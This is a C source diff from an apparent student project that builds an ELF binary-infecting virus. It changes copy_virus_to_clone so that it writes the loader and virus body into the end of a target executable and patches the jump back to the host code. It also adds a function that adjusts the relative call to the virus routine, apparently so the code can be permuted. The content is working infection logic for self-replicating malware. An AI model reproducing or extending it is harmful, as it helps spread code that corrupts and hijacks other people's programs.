@@ -6,7 +6,7 @@
 /*   By: ichkamo <ichkamo@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2020/02/22 21:23:14 by ichkamo           #+#    #+#             */
-/*   Updated: 2020/12/01 21:20:24 by ichkamo          ###   ########.fr       */
+/*   Updated: 2021/06/15 19:58:03 by ichkamo          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -16,6 +16,7 @@
 #include "errors.h"
 #include "disasm.h"
 #include "virus.h"
+#include "write_jump.h"
 
 static bool	assign_jump32(void *jump_inst, int32_t rel)
 {
@@ -31,15 +32,15 @@ static bool	assign_jump32(void *jump_inst, int32_t rel)
 	return true;
 }
 
-bool	copy_virus_to_clone(struct safe_ptr clone_ref, const struct entry *original_entry)
+bool	copy_virus_to_clone(struct safe_ptr clone_ref, const struct entry *original_entry, \
+			struct virus_header *vhdr)
 {
 	// copy loader and virus
-	size_t	virus_size = (uint64_t)_start - (uint64_t)loader_entry;
-	void	*loader_location = safe(clone_ref, original_entry->end_of_last_section, virus_size);
+	void	*loader_location = safe(clone_ref, original_entry->end_of_last_section, vhdr->virus_size);
 
 	if (!loader_location) return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);
 
-	memcpy(loader_location, (void *)loader_entry, virus_size);//TODO not position indep after block permut
+	memcpy(loader_location, vhdr->loader_entry, vhdr->virus_size);
 
 	// gather offsets
 	size_t	shoff            = original_entry->safe_shdr->sh_offset;
@@ -66,6 +67,20 @@ bool	copy_virus_to_clone(struct safe_ptr clone_ref, const struct entry *original
 	// write new addr into clone's loader code
 	if (!assign_jump32(back_to_client_jump, rel_jump_client))
 		return errors(ERR_VIRUS, _ERR_COPY_LOADER_TO_CLONE);
+
+	return true;
+}
+
+bool	adapt_virus_call_in_loader(struct safe_ptr clone_ref, size_t loader_entry_off, int virus_func_shift)
+{
+	size_t	dist_loader_entry_vircall = call_virus - loader_entry;
+	size_t	off_vircall = loader_entry_off + dist_loader_entry_vircall;
+
+	void	*call_code = safe(clone_ref, off_vircall, JUMP32_INST_SIZE);
+	if (call_code == NULL) return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);
+
+	int32_t	*call_arg = (call_code + 1);
+	*call_arg += virus_func_shift;
 
 	return true;
 }
